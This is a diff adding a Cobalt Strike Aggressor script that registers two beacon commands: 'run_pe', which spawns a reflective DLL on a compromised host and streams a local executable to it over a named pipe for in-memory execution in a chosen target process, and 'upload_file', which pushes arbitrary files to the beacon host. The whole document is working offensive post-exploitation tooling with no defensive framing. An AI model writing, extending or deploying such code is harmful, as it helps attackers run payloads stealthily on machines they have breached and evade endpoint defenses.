@@ -1,0 +1,54 @@
+beacon_command_register("upload_file", "Uploads a local file and send to a file accessible by the beacon host (including pipes)", "upload_pipe");
+beacon_command_register("run_pe", "using named pipes to run_pe", "usage: run_pe pe_path -t Target_path -p Arguments");
+alias run_pe {
+	if(size(@_) = 1)
+	{
+		berror($1, "Incorrect usage!");
+		berror($1, beacon_command_detail("run_pe"));
+		return;
+	}
+	if(($3 eq "-t")||($5 eq "-p"))
+	{
+		$handle = openf($2);
+		$data = readb($handle, -1);
+		closef($handle);
+		$size = strlen($data);
+		blog($1,"file size ".$size);
+		$args = substr($0, 7);
+		$target_ = find("$args","-t",  0);
+		$Arguments_ = find("$args","-p",  0);
+		$target   = substr($args, $target_ + 2,$Arguments_ - 1);
+		$argv   = substr($args, $target_);
+		$Arguments   = substr($args, $Arguments_ + 2);
+		btask($1,"Run PE_Path: ".$2." Target_Path:".$target." Arguments:".$Arguments);
+		$test = $size." ".$argv;
+		if($size < 1048576)
+		{
+			bdllspawn($1,script_resource("reflective_dll.x64.dll"),$test, "", 1000, false);
+			#blog($1,"usage upload_file ".$2." \\\\.\\pipe\\mynamedpipe")
+			bupload_raw($1, "\\\\.\\pipe\\mynamedpipe", $data);
+		}
+		else
+		{
+			bdllspawn($1,script_resource("reflective_dll.x64.dll"),$test, "", 1000, false);
+			blog($1,"usage upload_file ".$2." \\\\.\\pipe\\mynamedpipe")
+			#bupload_raw($1, "\\\\.\\pipe\\mynamedpipe", $data);
+		}
+	}
+	else
+	{
+		berror($1, "Incorrect usage!");
+		berror($1, beacon_command_detail("run_pe"));
+		return;
+	}
+}
+sub _upload_file{
+	$handle = openf($2);
+	$data = readb($handle, -1);
+	closef($handle);
+    bupload_raw($1, $3, $data);
+}
+
+alias upload_file {
+	_upload_file($1, $2, $3);
+}
